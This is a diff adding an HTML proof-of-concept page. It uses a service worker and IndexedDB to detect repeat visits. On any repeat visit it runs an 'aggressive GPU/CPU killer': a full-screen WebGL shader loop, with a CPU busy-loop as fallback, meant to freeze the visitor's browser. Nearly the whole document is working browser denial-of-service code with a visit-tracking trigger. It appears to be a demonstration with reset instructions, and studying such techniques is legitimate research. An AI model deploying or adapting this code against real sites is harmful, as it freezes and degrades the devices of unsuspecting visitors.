@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SW-Only Detection PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: #1a1a2e;
+            color: #eee;
+        }
+        #status {
+            padding: 20px 40px;
+            border-radius: 8px;
+            margin: 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .fresh { background: #16a34a; }
+        .cached { background: #dc2626; }
+        .waiting { background: #ca8a04; }
+        #info {
+            max-width: 600px;
+            text-align: center;
+            line-height: 1.6;
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #2563eb; }
+        code {
+            background: #333;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <h1>Service Worker Only Detection PoC</h1>
+    <div id="status" class="waiting">Initializing...</div>
+    <div id="info"></div>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ============================================
+        // SERVICE WORKER ONLY DETECTION
+        // No localStorage or sessionStorage used!
+        // ============================================
+
+        // Check visit status injected by Service Worker
+        function checkSWVisitStatus() {
+            // Method 1: Check injected global variable (set by SW before this script runs)
+            if (window.__SW_VISIT_STATUS__) {
+                return {
+                    isRepeatVisit: window.__SW_VISIT_STATUS__.isRepeatVisit,
+                    source: window.__SW_VISIT_STATUS__.source,
+                    reason: window.__SW_VISIT_STATUS__.isRepeatVisit
+                        ? 'SW IndexedDB: page already visited'
+                        : 'SW IndexedDB: first visit'
+                };
+            }
+
+            // Method 2: Check if SW is controlling this page (fallback)
+            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                // SW is active but didn't inject status - might be a race condition
+                // This shouldn't happen normally, but we handle it
+                return {
+                    isRepeatVisit: false,
+                    source: 'sw-controller-check',
+                    reason: 'SW active but no status injected (first load)'
+                };
+            }
+
+            // Method 3: No SW control yet - definitely first visit
+            return {
+                isRepeatVisit: false,
+                source: 'no-sw-control',
+                reason: 'Service Worker not yet active (first visit)'
+            };
+        }
+
+        // ============================================
+        // WEBGL FREEZE - Aggressive GPU/CPU killer
+        // ============================================
+
+        function triggerFreeze() {
+            const canvas = document.getElementById('canvas');
+            canvas.style.zIndex = '9999';
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            const gl = canvas.getContext('webgl2') ||
+                       canvas.getContext('webgl') ||
+                       canvas.getContext('experimental-webgl');
+
+            if (!gl) {
+                console.log('[FREEZE] WebGL not available, using CPU freeze');
+                cpuFreeze();
+                return;
+            }
+
+            console.log('[FREEZE] Starting WebGL freeze');
+
+            const vsSource = `
+                attribute vec4 a_position;
+                void main() {
+                    gl_Position = a_position;
+                }
+            `;
+
+            const fsSource = `
+                precision highp float;
+                uniform float u_time;
+                uniform vec2 u_resolution;
+
+                void main() {
+                    vec2 uv = gl_FragCoord.xy / u_resolution;
+                    float v = 0.0;
+
+                    for(int i = 0; i < 500; i++) {
+                        for(int j = 0; j < 20; j++) {
+                            float fi = float(i);
+                            float fj = float(j);
+                            v += sin(fi * u_time * 0.01) * cos(fj * u_time * 0.01);
+                            v += tan(v * 0.001) * sin(uv.x * fi) * cos(uv.y * fj);
+                            v = fract(v);
+                        }
+                    }
+
+                    gl_FragColor = vec4(v, v * 0.5, v * 0.2, 1.0);
+                }
+            `;
+
+            function createShader(gl, type, source) {
+                const shader = gl.createShader(type);
+                gl.shaderSource(shader, source);
+                gl.compileShader(shader);
+                if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+                    console.error('Shader error:', gl.getShaderInfoLog(shader));
+                    return null;
+                }
+                return shader;
+            }
+
+            const vs = createShader(gl, gl.VERTEX_SHADER, vsSource);
+            const fs = createShader(gl, gl.FRAGMENT_SHADER, fsSource);
+
+            if (!vs || !fs) {
+                cpuFreeze();
+                return;
+            }
+
+            const program = gl.createProgram();
+            gl.attachShader(program, vs);
+            gl.attachShader(program, fs);
+            gl.linkProgram(program);
+
+            if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+                console.error('Program error:', gl.getProgramInfoLog(program));
+                cpuFreeze();
+                return;
+            }
+
+            gl.useProgram(program);
+
+            const positions = new Float32Array([
+                -1, -1,  1, -1,  -1, 1,
+                -1,  1,  1, -1,   1, 1
+            ]);
+
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
+
+            const posAttr = gl.getAttribLocation(program, 'a_position');
+            gl.enableVertexAttribArray(posAttr);
+            gl.vertexAttribPointer(posAttr, 2, gl.FLOAT, false, 0, 0);
+
+            const timeUniform = gl.getUniformLocation(program, 'u_time');
+            const resUniform = gl.getUniformLocation(program, 'u_resolution');
+
+            gl.uniform2f(resUniform, canvas.width, canvas.height);
+
+            let time = 0;
+
+            function render() {
+                time += 0.5;
+                gl.uniform1f(timeUniform, time);
+
+                for (let i = 0; i < 50; i++) {
+                    gl.drawArrays(gl.TRIANGLES, 0, 6);
+                }
+
+                let x = 0;
+                for (let i = 0; i < 100000; i++) {
+                    x += Math.sin(i) * Math.cos(i);
+                }
+
+                requestAnimationFrame(render);
+            }
+
+            render();
+        }
+
+        function cpuFreeze() {
+            console.log('[FREEZE] Starting CPU freeze');
+
+            function burn() {
+                const start = Date.now();
+                while (Date.now() - start < 100) {
+                    for (let i = 0; i < 1000000; i++) {
+                        Math.sin(Math.random()) * Math.cos(Math.random()) * Math.tan(Math.random());
+                    }
+                }
+                requestAnimationFrame(burn);
+            }
+            burn();
+        }
+
+        // ============================================
+        // MAIN EXECUTION
+        // ============================================
+
+        // Register Service Worker first
+        async function init() {
+            const statusEl = document.getElementById('status');
+            const infoEl = document.getElementById('info');
+
+            // Register SW if not already registered
+            if ('serviceWorker' in navigator) {
+                try {
+                    const reg = await navigator.serviceWorker.register('sw.js');
+                    console.log('[SW] Registered:', reg.scope);
+
+                    // If SW just registered and not controlling yet, this is definitely first visit
+                    if (!navigator.serviceWorker.controller) {
+                        console.log('[SW] First registration - waiting for control');
+
+                        // Wait for SW to take control
+                        await new Promise((resolve) => {
+                            navigator.serviceWorker.addEventListener('controllerchange', resolve);
+                            // Timeout after 2 seconds - proceed anyway
+                            setTimeout(resolve, 2000);
+                        });
+                    }
+                } catch (err) {
+                    console.log('[SW] Registration failed:', err);
+                }
+            }
+
+            // Check visit status
+            const result = checkSWVisitStatus();
+            console.log('[DETECTION] Result:', result);
+
+            if (!result.isRepeatVisit) {
+                // First visit - show success
+                statusEl.textContent = 'FIRST VISIT - OK';
+                statusEl.className = 'fresh';
+                infoEl.innerHTML = `
+                    <p><strong>Detection Source:</strong> ${result.source}</p>
+                    <p><strong>Reason:</strong> ${result.reason}</p>
+                    <hr style="margin: 20px 0; border-color: #444;">
+                    <p>This page uses <strong>Service Worker + IndexedDB only</strong>.</p>
+                    <p>No localStorage or sessionStorage is used!</p>
+                    <hr style="margin: 20px 0; border-color: #444;">
+                    <p><strong>Now try:</strong></p>
+                    <ul style="text-align:left;">
+                        <li>Reload this page (Ctrl+R / Cmd+R)</li>
+                        <li>Open this URL in a new tab</li>
+                        <li>Close and reopen the browser</li>
+                    </ul>
+                    <p>Any of these will trigger the freeze!</p>
+                    <hr style="margin: 20px 0; border-color: #444;">
+                    <p><strong>To reset:</strong></p>
+                    <button onclick="resetVisits()">Reset via SW Message</button>
+                    <p><small>Or: DevTools → Application → Service Workers → Unregister + Clear Storage</small></p>
+                `;
+            } else {
+                // Repeat visit - FREEZE
+                statusEl.textContent = 'REPEAT VISIT - FREEZING!';
+                statusEl.className = 'cached';
+                infoEl.innerHTML = `
+                    <p><strong>Detection Source:</strong> ${result.source}</p>
+                    <p><strong>Reason:</strong> ${result.reason}</p>
+                    <p style="color: #f87171; font-size: 20px; margin-top: 20px;">
+                        Triggering WebGL freeze NOW...
+                    </p>
+                    <p><small>The Service Worker detected this is not your first visit.</small></p>
+                    <p><small>Visit tracking is stored in IndexedDB within the SW scope.</small></p>
+                `;
+
+                setTimeout(triggerFreeze, 500);
+            }
+        }
+
+        // Reset visits via SW message
+        function resetVisits() {
+            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({ type: 'RESET_VISITS' });
+
+                navigator.serviceWorker.addEventListener('message', function handler(event) {
+                    if (event.data.type === 'RESET_COMPLETE') {
+                        alert('Visits reset! Reload the page.');
+                        navigator.serviceWorker.removeEventListener('message', handler);
+                    }
+                });
+            } else {
+                alert('Service Worker not active. Clear site data manually.');
+            }
+        }
+
+        // Run after short delay to ensure SW injection has happened
+        setTimeout(init, 100);
+    </script>
+</body>
+</html>
